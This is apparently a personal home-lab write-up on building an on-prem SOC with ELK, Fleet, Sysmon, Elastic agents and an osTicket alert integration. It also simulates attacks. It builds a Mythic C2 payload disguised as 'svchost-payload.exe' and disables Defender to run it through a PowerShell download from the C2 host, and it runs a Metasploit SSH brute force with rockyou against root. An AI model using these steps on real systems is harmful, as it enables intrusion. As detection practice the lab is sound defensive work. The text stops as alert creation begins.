I built a fully functional, on-prem SOC lab from scratch using the ELK Stack, Sysmon, and Mythic C2, configuring endpoints to forward logs, creating detection rules and dashboards, and simulating real-world attacks like brute force activity. By generating and investigating my own attack data, I gained hands-on experience with log ingestion, threat detection, alert tuning, and incident response workflows. This project strengthened both my technical understanding of security operations and my ability to document and present complex findings in a clear format.
## Creating a Logical Diagram
Using draw.io, I created the following diagram to clearly and effectively illustrate the lab environment:

![](attachments/Pasted%20image%2020260502162629.png)

## ELK Stack Introduction

The **ELK Stack** is a powerful combination of tools used for centralized logging, analysis, and visualization of security data.
### **Elasticsearch (E): Data Storage & Search**
- A high-performance database for storing logs (Windows events, syslogs, firewall logs, etc.)
- Enables fast, flexible searching across large datasets
- Uses **ESQL** for querying data
- Supports RESTful APIs and JSON, making it easy to integrate with other tools and automate data retrieval
### **Logstash (L): Data Collection & Processing**
- Acts as a pipeline to collect and process telemetry from multiple sources
- Normalizes and forwards data into Elasticsearch
- Supports log collection via:
    - **Beats** (lightweight shippers):
        - Filebeat: Logs
        - Metricbeat: System metrics
        - Packetbeat: Network data
        - Winlogbeat: Windows events
        - Auditbeat: Audit data
        - Heartbeat: Uptime monitoring
    - **Elastic Agent**: A unified agent that collects multiple data types from a single host
- Allows filtering and transformation of logs for highly customized ingestion
### **Kibana (K): Visualization & Analysis**
- A web-based interface for interacting with Elasticsearch data
- Key features include:
    - **Discover**: Query and explore logs using ESQL
    - **Kibana Lens**: Build visualizations and dashboards
- Enables analysts to:
    - Search and analyze data
    - Create visualizations and dashboards
    - Generate reports
    - Configure alerts
### **Key Benefits of the ELK Stack**
- **Centralized Logging**: Aggregate and search logs in one place (useful for compliance and investigations)
- **Flexibility**: Highly customizable data ingestion and processing
- **Visualization**: Gain insights quickly through dashboards
- **Scalability**: Designed to handle growth in data and infrastructure
- **Ecosystem**: Strong community support and extensive integrations

---
## Elasticsearch Setup

### 1. Download Ubuntu Server
- Download [Ubuntu Server 24.04 LTS](https://ubuntu.com/download/server )
- This will be used inside VirtualBox

---

### 2. Configure VirtualBox NAT Network
1. Open **VirtualBox**
2. Navigate to: **File → Tools → Network Manager**
3. Select **NAT Networks** → Click **Create**
4. Configure:
   - **Name:** `ELK-SOC-Lab`
   - **IPv4 Prefix:** `172.31.0.0/24`
5. Click **Apply**

---

### 3. Create Ubuntu Server VM
1. Go to: **Machine → New**
2. Configure:
   - **Name:** `ELK-VM`
   - **ISO Image:** Ubuntu Server ISO
   - Enable: **Skip Unattended Installation**
3. Hardware:
   - **Memory:** 16384 MB
   - **CPU:** 2 processors
4. Storage:
   - **Disk Size:** 50 GB
5. After creation:
   - Right-click **ELK-VM → Settings**
   - Go to **Network**
   - Set:
     - **Attached to:** NAT Network
     - **Network Name:** `ELK-SOC-Lab`
   - Click **OK**

---

### 4. Install Ubuntu Server
1. Start the VM
2. Proceed through installer:
   - Press **Enter** through most prompts
   - Set credentials at **Profile Setup**
3. On **SSH Setup** screen:
   - Press **Spacebar** to enable **Install OpenSSH Server**
4. Finish installation and reboot
   - If you see `Failed unmounting cdrom.mount`, press **Enter** (safe to ignore)

---

### 5. Enable SSH Access

#### Get VM IP
```bash
ip a
```
- **My IP:** `172.31.0.4`

#### Enable SSH
```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

#### Configure Port Forwarding (VirtualBox)
1. Go to **Tools → Netowrk → NAT Networks**
2. Click **Port Forwarding**
3. Add rule:
   - **Name:** SSH
   - **Host IP:** 127.0.0.1
   - **Host Port:** 2222
   - **Guest IP:** 172.31.0.4
   - **Guest Port:** 22

#### Connect via SSH
```bash
ssh <username>@127.0.0.1 -p 2222
```
- Type `yes` when prompted
- Enter credentials

---

### 6. Install Elasticsearch

#### Update System
```bash
sudo apt update && sudo apt upgrade -y
```

#### Take Snapshot (Recommended)
- VirtualBox → **Machine → Take Snapshot**
- **Name:** `Updated-BaseInstall`

#### Download Elasticsearch
- Copy `.deb` link from:  
  https://www.elastic.co/downloads/elasticsearch

```bash
wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-9.3.3-amd64.deb
```

#### Install Package
```bash
sudo dpkg -i elasticsearch-9.3.3-amd64.deb
```

#### Important
- Save the [[Security autoconfiguration information]]
  - Contains auto-generated credentials

---

### 7. Configuring Elasticsearch

#### Modify the Elasticsearch YAML file
```bash
sudo nano /etc/elasticsearch/elasticsearch.yml
```
1. Change `network.host` to **172.31.0.4**
2. Uncomment the `http.port` variable, keep port **9200**
3. Save these changes by pressing **Ctrl+X → Y → Enter**

---

### 8. Start Elasticsearch
```bash
sudo systemctl daemon-reload
sudo systemctl enable elasticsearch.service
sudo systemctl start elasticsearch.service
sudo systemctl status elasticsearch.service
```

---

## Kibana Setup

### 1. Download Kibana
- Copy `.deb` link from:  
  [https://www.elastic.co/downloads/elasticsearch](https://www.elastic.co/downloads/kibana)

```bash
wget https://artifacts.elastic.co/downloads/kibana/kibana-9.3.3-amd64.deb
```

#### Install Package
```bash
sudo dpkg -i kibana-9.3.3-amd64.deb
```

---

### 2. Configure Kibana
#### Modify the Kibana YAML file
```bash
sudo nano /etc/kibana/kibana.yml
```
1. Uncomment the `server.port` variable, keep port **5601**
2. Uncomment and change `server.host` to **172.31.0.4**
3. Uncomment and change `server.publicBaseUrl` to http://172.31.0.4:5601
4. Save these changes by pressing **Ctrl+X → Y → Enter**

---

### 3. Create encryption keys for alerting

#### Change directory
```bash
cd /usr/share/kibana/bin
```
#### Generate encryption keys
```bash
sudo ./kibana-encryption-keys generate
```
- Make sure to **save these encryption keys**

#### Add keys to keystore
```bash
sudo ./kibana-keystore add xpack.encryptedSavedObjects.encryptionKey
sudo ./kibana-keystore add xpack.reporting.encryptionKey
sudo ./kibana-keystore add xpack.security.encryptionKey
```

---

### 4. Start Kibana
```bash
sudo systemctl daemon-reload
sudo systemctl enable kibana.service
sudo systemctl start kibana.service
sudo systemctl status kibana.service
```
![](attachments/Pasted%20image%2020260421224127.png)

---

### 5. Access Kibana

#### Configure Port Forwarding (VirtualBox)
1. Go to **Tools → Netowrk → NAT Networks**
2. Click **Port Forwarding**
3. Add rule:
   - **Name:** Web GUI (ELK)
   - **Host IP:** 127.0.0.1
   - **Host Port:** 5602
   - **Guest IP:** 172.31.0.4
   - **Guest Port:** 5601

#### Access Web GUI
- Using your host machine, open a browser and go to `127.0.0.1:5602`
![510](attachments/Pasted%20image%2020260421231612.png)
#### Generate Welcome Token (ELK-VM)
```
cd /usr/share/elasticsearch/bin
sudo ./elasticsearch-create-enrollment-token --scope kibana
```
- Copy this enrollment token and **paste it in the Kibana web GUI**
#### Generate Kibana Verification Code
```bash
cd /usr/share/kibana/bin
sudo ./kibana-verification-code
```
- Copy this verification code and **paste it in the Kibana web GUI**
![553](attachments/Pasted%20image%2020260421231744.png)
#### Sign In Using Generated Credentials
- **Username:** elastic
- **Password:** This will come from the previous **Security autoconfiguration information**
![508](attachments/Pasted%20image%2020260421232028.png)

#### We've now accessed our Kibana GUI!
![](attachments/Pasted%20image%2020260421232124.png)

---

## Fleet Server Setup
#### What is a Fleet Server?
A fleet server is a component that connects your elastic agents to a **fleet**, which will allow for centralized management of all Elastic Agents. This makes it very easy to update the agent's policy, if we wanted to add new integrations for data ingestion.
### 1. Create VM
1. Go to: **Machine → New**
2. Configure:
   - **Name:** `Fleet-Server`
   - **ISO Image:** Ubuntu Server ISO
   - Enable: **Skip Unattended Installation**
3. Hardware:
   - **Memory:** 4096 MB
   - **CPU:** 1 processor
4. Storage:
   - **Disk Size:** 25 GB
5. After creation:
   - Right-click **ELK-VM → Settings**
   - Go to **Network**
   - Set:
     - **Attached to:** NAT Network
     - **Network Name:** `ELK-SOC-Lab`
   - Click **OK**

---

### 2. Set up VM
- Installing Ubuntu Server is exactly the same as listed before

#### Get VM IP
```bash
ip a
```
- **My IP:** `172.31.0.6`

#### Enable SSH
```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

#### Configure Port Forwarding (VirtualBox)
1. Go to **Tools → Netowrk → NAT Networks**
2. Click **Port Forwarding**
3. Add rule:
   - **Name:** SSH
   - **Host IP:** 127.0.0.1
   - **Host Port:** 2223
   - **Guest IP:** 172.31.0.6
   - **Guest Port:** 22

#### Connect via SSH
```bash
ssh <username>@127.0.0.1 -p 2223
```
- Type `yes` when prompted
- Enter credentials

#### Update System
```bash
sudo apt update && sudo apt upgrade -y
```

#### Take Snapshot (Recommended)
- VirtualBox → **Machine → Take Snapshot**
- **Name:** `Updated-BaseInstall`

---

### 3. Add Fleet Server to ELK Web GUI

#### Navigate to the Fleet Menu
![](attachments/Pasted%20image%2020260422213215.png)

#### Add Fleet Server
1. Click on the **Add Fleet Server** button
2. **Name:** Fleet-Server
3. **URL:** `https://172.31.0.6`
4. Click on **Generate Fleet Server policy**
5. Once created, the default port will be **443**, however, we want to change this to **8220**
6. Click on **Continue** then the **Fleet Settings** button
7. Click on the **Edit** pencil icon
8. Change the **URL** to `https://172.30.0.6:8220`
9. Click on **Save and apply settings → Save and deploy**
10. Once done, click on the **Agents** menu, then **Add Fleet Server**
11. Under **Fleet Server Hosts**, choose the one we just created, then click **Continue**
12. Copy the **Linux Tar**
13. Paste this in the **Fleet-VM** terminal, then click **Enter → Y**
14. Once done, return to the ELK GUI and we should now see **Fleet Server Connected**

---

## Windows Server Setup
### 1. Download Windows Server
- Download [Windows Server 2022]([https://ubuntu.com/download/server ](https://www.microsoft.com/en-us/evalcenter/download-windows-server-2022))
- This will be used inside VirtualBox

---
### 2. Create VM
1. Go to: **Machine → New**
2. Configure:
   - **Name:** `Windows-Server-VM`
   - **ISO Image:** `SERVER_EVAL_x64FRE_en-us.iso`
   - Enable: **Skip Unattended Installation**
3. Hardware:
   - **Memory:** 4096 MB
   - **CPU:** 1 processor
4. Storage:
   - **Disk Size:** 50 GB
5. After creation:
   - Right-click **ELK-VM → Settings**
   - Go to **Network**
   - Set:
     - **Attached to:** NAT Network
     - **Network Name:** `ELK-SOC-Lab`
   - Click **OK**

---

### 3. Install Windows Server
1. Start the VM
2. Proceed through installer:
   - Press **Next → Install** 
   - Choose **Windows Server 2022 Standard Evaluation (Desktop Experience) → Next**
   - Press **Accept the terms → Next**
   - Choose **Custom → Default Drive → Next**
   - Once the server has been installed, choose a password and click **Finish**
#### Take Snapshot (Recommended)
- VirtualBox → **Machine → Take Snapshot**
- **Name:** `BaseInstall`

---

### 4. Set up Sysmon
#### What is Sysmon?
Sysmon, short for SystemMonitor, is a free Microsoft tool that is part of the [Sysinternals Suite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). It provides us with a lot more telemetry than the default Windows Event Logs. It has the capability to monitor events such as, **process creations**, **network connections**, **file creations**, and many more. By having more visibility, this will increase the chances of us catching potential threat actors.
1. To get past the lock screen, click on **Input → Keyboard → Insert Ctrl-Alt-Del**
2. Once on the homescreen, open up **Microsoft Edge**
3. Search for **sysmon** and click on [Sysmon - Sysinternals | Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
4. Click on [Download Sysmon](https://download.sysinternals.com/files/Sysmon.zip)
5. Also search for **olaf sysmon config** and click on the [sysmon-modular](https://github.com/olafhartong/sysmon-modular) GitHub repo
6. Scroll down and click on **sysmonconfig.xml**
7. From there, click on **Download raw file**
8. In the Downloads directory, right-click **Sysmon.zip → Extract all**
9. Within the extracted Sysmon folder, open PowerShell by holding **Shift+Right-click → Open PowerShell window here**
10. Type in `.\Sysmon64.exe -i ..\sysmonconfig.xml`
11. Agree to the license terms, and Sysmon should now be installed

---

## Elastic Agent Setup

### 1. Windows Agent

#### Enable Copy & Paste to VM
1. Go to: **Devices → Insert Guest Additions CD image...**
2. Open up **File Explorer → This PC** and look for the **VirtualBox Guest Additions** CD drive
3. Double-click it, and open **VBoxWindowsAdditions**
4. Run through the installer then click **Reboot now**
5. Once rebooted, go to:  **Devices → Shared Clipboard → Bidirectional**

If you're on **Linux**, you may have to manually download the **VBoxGuestAdditions** ISO file from the official [VirtualBox download site](https://download.virtualbox.org/virtualbox)
1. Once downloaded, from the running Windows Server VM go to: **Devices → Optical Drivers → Choose a disk file** and choose the guest additions file
2. Once done, follow the steps listed above

#### Create Our Windows Agent Policy
1. From the **Fleet** page in our ELK Web GUI, click on the **Add agent** button
2. Click on **Create new agent policy**
3. Name the policy **Win-Policy**
4. Click on **Create policy**
5. Choose the **Windows x86_64** option then copy this
#### Installing Elastic Agent
1. Open up **PowerShell** and paste the **Win-Policy** install command
2. At the end of the command, add `--insecure` then click **Enter → y**
	- Without adding this to the end, the installation will fail as we're using a self-signed certificate
3. In our ELK Web GUI, we should now be able to see that the agent was successfully enrolled:
![](attachments/Pasted%20image%2020260424123727.png)

---

### 2. Linux Agent
#### Create Our Linux Agent Policy
1. From the **Fleet** page in our ELK Web GUI, click on the **Add agent** button
2. Click on **Create new agent policy**
3. Name the policy **Linux-Policy**
4. Ensure that **Enroll in Fleet (recommended)** is selected
5. Click on **Create policy**
6. Scroll down and choose the **Linux x86_64** option then copy this

### Installing Elastic Agent
1. SSH into our **Ubuntu-VM** and paste the **Linux-Policy** install command
2. At the end of the command, add `--insecure` then click **Enter → y**
3. In our ELK Web GUI, we should now be able to see that the agent was successfully enrolled:
![](attachments/Pasted%20image%2020260424145859.png)

---

## Push Sysmon & Defender Data
### Navigate to the Integrations Menu
![](attachments/Pasted%20image%2020260424150057.png)

### Push Windows Event Logs
1. Search for **Custom Windows Event Logs**
2. Open this and click **Add Custom Windows Event Logs**
3. Set the **Integration name** as **Sysmon**
4. To find the **Channel Name**, you must:
	1. Open the Windows Server VM and search for **Event Viewer**
	2. Once open, go to: **Applications and Services Logs → Microsoft → Windows → Sysmon → Operational**
	3. Right-click on **Operational** and select **Properties**
	4. Copy the **Full Name** attribute and paste that into our **Channel Name** field
5. Scroll down to **Where to add this integration?** and choose **Existing hosts**
6. Select the **Win-Policy** we created earlier
7. Click on **Save and continue → Save and deploy changes**

### Push Windows Defender Logs
1. Return to **Event Viewer** in our Windows Server VM
2. In the same **Windows** folder we were in, search for **Windows Defender**
3. Right-click on **Operational → Properties** and copy the full name
4. Return to the ELK Web GUI and click **Add Custom Windows Event Logs**
5. Repeat the same steps as earlier, but change the following:
	- **Integration name:** Defender
	- **Channel Name:** Paste the full name from earlier
### Setup Windows RDP
1. In the Windows Server VM, search up **Remote desktop settings**
2. Set **Enable Remote Desktop** to **On**

---

## Mythic C2 Server Setup
### 1. Create VM
1. Go to: **Machine → New**
2. Configure:
   - **Name:** `Mythic-VM`
   - **ISO Image:** Ubuntu Server ISO
   - Enable: **Skip Unattended Installation**
3. Hardware:
   - **Memory:** 4096 MB
   - **CPU:** 2 processors
1. Storage:
   - **Disk Size:** 50 GB
1. After creation:
   - Right-click **ELK-VM → Settings**
   - Go to **Network**
   - Set:
     - **Attached to:** NAT Network
     - **Network Name:** `ELK-SOC-Lab`
   - Click **OK**

---

### 2. Setup VM
- Installing Ubuntu Server is exactly the same as listed before

#### Get VM IP
```bash
ip a
```
- **My IP:** `172.31.0.10`

#### Enable SSH
```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

#### Configure Port Forwarding (VirtualBox)
1. Go to **Tools → Network → NAT Networks**
2. Click **Port Forwarding**
3. Add rule:
   - **Name:** SSH
   - **Host IP:** 127.0.0.1
   - **Host Port:** 2223
   - **Guest IP:** 172.31.0.10
   - **Guest Port:** 22

#### Connect via SSH
```bash
ssh <username>@127.0.0.1 -p 2225
```
- Type `yes` when prompted
- Enter credentials

#### Update System
```bash
sudo apt update && sudo apt upgrade -y
```

#### Take Snapshot (Recommended)
- VirtualBox → **Machine → Take Snapshot**
- **Name:** `Updated-BaseInstall`

---

### 3. Setup Mythic
#### Install Docker
```bash
sudo apt install docker-compose -y
sudo systemctl enable docker.service
sudo systemctl start docker.service
sudo systemctl status docker.service
```

#### Install Make
```bash
sudo apt install make
```
#### Download Mythic
```bash
sudo git clone https://github.com/its-a-feature/Mythic
cd Mythic
```
#### Install Mythic
Within the `Mythic` directory:
```bash
./install_docker_ubuntu.sh
sudo make
```
#### Start Mythic CLI
```bash
sudo ./mythic-cli start
```
#### Obtain Mythic Credentials
```bash
cat .env | grep MYTHIC_ADMIN_PASSWORD
```

---

### 4. Access Mythic Server From Host Machine
#### Configure Port Forwarding (VirtualBox)
1. Go to **Tools → Network → NAT Networks**
2. Click **Port Forwarding**
3. Add rule:
   - **Name:** Mythic (GUI)
   - **Host IP:** 127.0.0.1
   - **Host Port:** 8443
   - **Guest IP:** 172.31.0.10
   - **Guest Port:** 7443
#### Access From Host Browser
- If we try to simply type in: `127.0.0.1:8443` in our web browser, we'll receive the following error message:
![](attachments/Pasted%20image%2020260425144718.png)
- To get around this, we must force https by entering `https://127.0.0.1:8443`
- A popup will appear stating this is a security risk due to this using a self-signed cert 
- To get past this, we must click **Accept the Risk and Continue**
- Once done, we should now see the Mythic login page:
![](attachments/Pasted%20image%2020260425144911.png)
- The credentials are:
	- **Username:** mythic_admin
	- **Password:** Obtained from the `.env` file earlier
- Once logged in, we should now see the following dashboard:
![](attachments/Pasted%20image%2020260425145056.png)

---

### 5. Downloading Payloads
**Note:** Ensure you are in the **Mythic** directory for these commands to work
#### Git Clone the Apollo Agent
```bash
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
```
#### Install the HTTP C2 Profile
```bash
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
```
#### Confirm Installation in Web GUI
Click on the **Installed Services** icon (headphones) on the left menu bar
![](attachments/Pasted%20image%2020260426180020.png)
![](attachments/Pasted%20image%2020260426180109.png)

---

### 6. Craft Our Payload
1. Click on the **Payloads** icon on the left menu bar
2. Click on **Actions → Generate New Payload**
![](attachments/Pasted%20image%2020260426180428.png)
3. On the **Payload Creation** screen, leave **Windows** for the operating system and **apollo** as the payload type, then click **Next**
4. On the next screen, leave the **output_type** as **WinExe**, then click **Next**
5. For the **commands**, make sure to select all available commands:
![](attachments/Pasted%20image%2020260426180743.png)
6. On the next screen, leave **http** as the **C2 profile** to include and click on **INCLUDE PROFILE**
7. Set the **callback_host** to `https://<local_ip_mythic-vm>`
![](attachments/Pasted%20image%2020260426181437.png)
8. Click **Next**, then leave everything on the following page as the default and click **CREATE PAYLOAD**
9. Now our payload is ready for download!

---

### 7. Download Our Payload
1. Right-click the **Download here** hyperlink and choose **Copy link**
2. In my case, the link is https://127.0.0.1:8443/direct/download/6eb4f021-9628-41c6-aea9-ce9a7e7dc964
3. To download this to our Mythic VM, we'll want to modify this to https://172.31.0.10:7443/direct/download/6eb4f021-9628-41c6-aea9-ce9a7e7dc964
4. Return to our Mythic VM, and treturn to the home directory by entering `cd ~`
5. Enter the command:
```bash
wget https://172.31.0.10:7443/direct/download/6eb4f021-9628-41c6-aea9-ce9a7e7dc964 --no-check-certificate
```
6. Verify the file has downloaded by entering `ls`:
![](attachments/Pasted%20image%2020260501104612.png)
7. Rename the file to something that can be executed on our Windows Server:
```bash
mv <file name> svchost-payload.exe
```

---

### 8. Host Our Payload
1. Using **python3**, we'll be hosting this file on port **9999**
```bash
python3 -m http.server 9999
```
#### Disable Windows Defender
1. Return to the Windows Server VM, and search for **Windows Security**
2. Once open, click on **Virus & threat protection → Manage settings**
3. On this page, disable everything that's currently enabled:
![](attachments/Pasted%20image%2020260501105353.png)
4. Scroll down to find the **Exclusions** section, then click on **Add or remove exclusions**
5. Add an exclusion to the **Downloads** folder:
![](attachments/Pasted%20image%2020260501105454.png)
#### Download the Payload from our Mythic VM
1. Open up PowerShell, and run the following:
```powershell
invoke-webrequest -uri http://(mythic-vm-ip):9999/svchost-payload.exe -Outfile "C:\Users\Administrator\Downloads\svchost-payload.exe"
```
2. Verify that this is now in our **Downloads** folder:
![](attachments/Pasted%20image%2020260501105939.png)
#### Run the Payload
1. Double-click on `svchost-payload` in our Windows Server VM
2. In our **Mythic dashboard**, we can confirm whether we have an active callback by clicking on the **phone icon**:
![](attachments/Pasted%20image%2020260501124627.png)

---

## osTicket Server Setup
### 1. Create VM (VirtualBox)
1. Go to: **Machine → New**
2. Configure:
   - **Name:** `osTicket-VM`
   - **ISO Image:** `SERVER_EVAL_x64FRE_en-us.iso`
   - Enable: **Skip Unattended Installation**
3. Hardware:
   - **Memory:** 2048 MB
   - **CPU:** 1 processor
4. Storage:
   - **Disk Size:** 50 GB
5. After creation:
   - Right-click **ELK-VM → Settings**
   - Go to **Network**
   - Set:
     - **Attached to:** NAT Network
     - **Network Name:** `ELK-SOC-Lab`
   - Click **OK**

---
### 2. Install Windows Server
1. Start the VM
2. Proceed through installer:
   - Press **Next → Install** 
   - Choose **Windows Server 2022 Standard Evaluation (Desktop Experience) → Next**
   - Press **Accept the terms → Next**
   - Choose **Custom → Default Drive → Next**
   - Once the server has been installed, choose a password and click **Finish**
#### Take Snapshot (Recommended)
- VirtualBox → **Machine → Take Snapshot**
- **Name:** `BaseInstall`

---

### 3. Install VirtualBox Guest Additions
1. Go to: **Devices → Insert Guest Additions CD image...**
2. Open up **File Explorer → This PC** and look for the **VirtualBox Guest Additions** CD drive
3. Double-click it, and open **VBoxWindowsAdditions**
4. Run through the installer then click **Reboot now**
5. Once rebooted, go to:  **Devices → Shared Clipboard → Bidirectional**

If you're on **Linux**, you may have to manually download the **VBoxGuestAdditions** ISO file from the official [VirtualBox download site](https://download.virtualbox.org/virtualbox)
1. Once downloaded, from the running Windows Server VM go to: **Devices → Optical Drivers → Choose a disk file** and choose the guest additions file
2. Once done, follow the steps listed above

---
### 4. Install Xampp
#### What is Xampp?
Xampp is an Apache distribution containing MySQL, PHP, and Perl
#### Download Xampp
1. Open up the **Edge browser** and search for **xampp**
2. Download this from the following URL: https://www.apachefriends.org/download.html
3. Download the 64-bit version of **8.2.12**
#### Install Xampp
1. Once downloaded, click on it to launch the installer
2. From here, simply click **Next** on everything

---

### 5. Configure Xampp
#### Modify Properties
1. Open **File Exporer** and navigate to **This PC → Local Disk (C:) → xampp** and scroll down until you find **properties**
2. **Right-click properties → Edit**
3. We want to change our **apache_domainname** and **mysql_host** to our osTicket-VM's local IP address
4. Open **PowerShell** and enter `ipconfig`
5. Look for the **IPv4 Address** which in my case is `172.31.0.12`
6. Enter this in for **apache_domainname** and **mysql_host**
7. Click on **File → Save**

---

### 6. Xampp Control Panel
1. Search for XAMPP Control Panel and open it
2. Start the **Apache** and **MySQL** modules:
![](attachments/Pasted%20image%2020260501132521.png)
3. For **Apache**, click on the **Admin** button
4. The dashboard will open, then click on **phpMyAdmin**:
![](attachments/Pasted%20image%2020260501132615.png)
#### Create a New Database
1. From the **phpMyAdmin** console, click on **New** on the left menu bar
2. Set the database name to whatever you like, I chose **ELK-SOC-DB**
3. Click on **Create**:
![](attachments/Pasted%20image%2020260501132903.png)
4. For now, let's leave the tables as blank
#### Change Root Account Creds
1. Click on the **Home → User accounts**
2. For our **root** account with the Host name **localhost**, click on **root**
3. Click on **Change password** and set it to whatever you'd like
	- This will create a bunch of error messages, but that's ok
4. Next, click on **Login Information**
5. Change **Host name** to **Use text field** and then enter this VM's local IP address, then click on **Go**
6. We will get an **access denied** error message, but we'll fix that
### Configure phpMyAdmin Folder
1. Return to **File Explorer** and navigate to `C:\xampp\phpMyAdmin`
2. Make a copy of **config.inc.php**
3. Rename this to **config.inc - backup.php**
4. Right-click the original version and click on **Open with → Notepad**
5. Once open, change the **password** field to the one we created earlier:
![](attachments/Pasted%20image%2020260501134500.png)
6. Also change the **host** to our VM's local IP:
![](attachments/Pasted%20image%2020260501134642.png)
7. Click on **File → Save**
8. Return to the **phpMyAdmin** dashboard and click on **Retry to connect**:
![](attachments/Pasted%20image%2020260501134806.png)
#### Ensure We Have Permissions to ELK-SOC-DB
1. Click on the **root** account with **Host name** 172.31.0.12
2. Click on **Database** and select **elk-soc-db**, then click **Go**
3. Under **Database-specific privileges**, click on the **Check all → Go**
4. Now we have full access to this database

---

### 7. Install osTicket
#### What is osTicket
osTicket is a free, open-source support ticket system which we will use to track all of our ELK-generated alerts
#### Download osTicket
1. Search for **osTicket**
2. Click on **Editions**
3. Download the **Open Source** version from https://osticket.com/editions/
4. Choose version **1.18.3**, then click on **Next Step**
5. For the language pack, choose **English (Great Britain)**, then **Next Step**
6. On the plugins screen, leave this blank and then **Next Step**
7. For the **Subscribe to osTicket Mailing Lists** pop up, click on **No Thanks**
8. osTicket should now begin downloading
#### Install osTicket
1. This will be downloaded as a zip folder which we will **Right-click → Extract All → Extract**
2. Copy the **scripts** and **upload** folders
3. Head to `C:\xampp\htdocs` and create a new folder titled **osticket**
4. Open this folder and paste the **scripts** and **upload** folders
5. Open the **upload → include** folder
6. Scroll down and rename **ost-sampleconfig** to **ost-config**

---

### 8. Access osTicket
1. In the **Edge** browser on the VM, go to `172.31.0.12/osticket/upload`
2. Click on **Continue**
3. On the following change, we want to change all of the fields:
![](attachments/Pasted%20image%2020260501140640.png)
	- Make sure the **MySQL Database** field is set to the one we created earlier in Xampp
4. Click on **Install Now**, and we can confirm that our osTicket system has been set up:
![](attachments/Pasted%20image%2020260502150544.png)
5. We can access our ticketing system by clicking on the **Staff Control Panel** link
6. We can now sign in using the credentials we set during the installer

---

### 9. Connect osTicket to Elastic:
#### Generate API Key
1. From the osTicket **Admin Control Panel**, we want to click on **Manage → API → Add New API Key**:
![](attachments/Pasted%20image%2020260502150925.png)
2. For the **IP Address** field, we want to enter in the IP of our **ELK-VM**
	- In my case, this will be **172.31.0.4**
3. Under the **Services** section, we want to click on **Can Create Tickets**
4. We can then click **Add Key** to generate our API connector:
![](attachments/Pasted%20image%2020260502151220.png)
5. Our API Key is now generated, and we can now copy this to our host machine
#### Integrate API to Elastic
1. On your host machine, return to the Elastic admin console by entering in `127.0.0.1:5602` to your web browser
2. Once signed in, click on the **Hamburger icon** on the top-left, then scroll down until you find **Stack Management**:
![](attachments/Pasted%20image%2020260502151635.png)
3. Once there, click on **Connectors** on the left menu bar:
![](attachments/Pasted%20image%2020260502151724.png)
4. Click on **Create connector**
	- **IMPORTANT NOTE:** When using the free Elastic license, you **will not** be able to use Webhooks, which is needed for this lab
	- For this challenge, we can get around this by enabling a **30-day free trial**
	- This can be done by clicking on **Manage license → Start trial → Start my trial**:
		![](attachments/Pasted%20image%2020260502151922.png)
		![](attachments/Pasted%20image%2020260502152025.png)
		![](attachments/Pasted%20image%2020260502152109.png)
5. Scroll down until we find **Webhook**:
![](attachments/Pasted%20image%2020260502152241.png)
6. From here, we can set the following fields:
	- **Connector name:** osTicket
	- **URL:** http://(**Local IP of your osTicket VM**)/osticket/upload/api/tickets.xml
	- **Authentication:** None
	- Click on **Add HTTP header**
		- **Key:** X-API-Key
		- **Value:** API Key from osTicket
7. Once done, click on **Save & test**
8. In the following **Test** screen, we can paste a test provided by the official [osTicket Github](https://github.com/osTicket/osTicket/blob/develop/setup/doc/api/tickets.md)
9. Scroll down until you see the **XML Payload Example**
10. Copy and paste this into our **Create an action** field:
![](attachments/Pasted%20image%2020260502155406.png)
11. When we click on **Run**, we will receive the following error message:
![](attachments/Pasted%20image%2020260502155526.png)
#### Allow Inbound HTTP & HTTPS Traffic to osTicket VM
1. On our osTicket VM, let's search for **Windows Defender Firewall with Advanced Security**
2. Click on **Inbound Rules** on the left menu bar
3. Click on **New Rule** on the right-hand side:
![](attachments/Pasted%20image%2020260502155850.png)
4. From here, select **Port → Next**
5. Create an inbound rule for ports **80** and **443**:
![](attachments/Pasted%20image%2020260502160029.png)
6. Click on **Next → Allow the connection → Next → Next → Name**
7. Set the name to **Allow inbound 80 & 443** then click **Finish**
#### Re-Run Connector Test
1. Return to the ELK admin console on our host machine and re-run the test, we should now see the following:
![](attachments/Pasted%20image%2020260502160302.png)
2. On our osTicket VM, we can return to our osTicket Control panel and click on **Agent Panel** at the top right:
![](attachments/Pasted%20image%2020260502160438.png)
3. We should now see our **Testing API** ticket:
![](attachments/Pasted%20image%2020260502160519.png)
4. This confirms our integration between osTicket and Elastic!

---

## Generating Telemetry
Being that this lab is not exposed to the internet, this begs the question: how can we generate SSH & RDP brute force alerts? By using Kali Linux of course!
### 1. Downloading Kali Linux
- Download the VirtualBox version from https://www.kali.org/get-kali/
- Unzip this folder

---

### 2. Add Kali VM
1. Go to: **Machine → Add**
2. Add the **kali-linux-2026.1-virtualbox-amd64.vdi** file
3. Leave everything at their default settings
	- The default credentials will be **kali/kali**
4. After creation:
   - Right-click **ELK-VM → Settings**
   - Go to **Network**
   - Set:
     - **Attached to:** NAT Network
     - **Network Name:** `ELK-SOC-Lab`
   - Click **OK**
#### Update System
```bash
sudo apt update && sudo apt upgrade -y
```

#### Take Snapshot (Recommended)
- VirtualBox → **Machine → Take Snapshot**
- **Name:** `Updated-BaseInstall`

---

### 3. Generating SSH Telemetry
1. Open up the **terminal** and navigate to the following directory:
```bash
cd /usr/share/wordlists
```
2. Unzip the **rockyou.txt.gz** wordlist:
```bash
sudo gunzip rockyou.txt.gz
```
3. Start up **Metasploit**:
```bash
msfconsole
```
4. Utilize an **SSH login auxiliary**:
```bash
use auxiliary/scanner/ssh/ssh_login
```
5. We want to modify the following options:
	- **RHOSTS:** The target host(s)
	- **PASS_FILE:** FIle containing passwords
	- **USERNAME:** A specific username to authenticate as
6. Since we'll be attacking our SSH server, these are the parameters I'll set:
```bash
set rhosts 172.31.0.9
set pass_file /usr/share/wordlists/rockyou.txt
set username root
```
7. To begin this attack, we will simply enter `run`

---

### 4. Confirming The Attack
1. Return to the ELK Web GUI, and navigate to the **Discover** tab
2. We can now filter for all failed SSH authentication attempts using the following query: `system.auth.ssh.event equals failed`:
![](attachments/Pasted%20image%2020260505001404.png)

---

## Creating Alerts & Dashboards
### Creating an Alert for Failed SSH Attempts
1. Navigate to the **Discover** tab
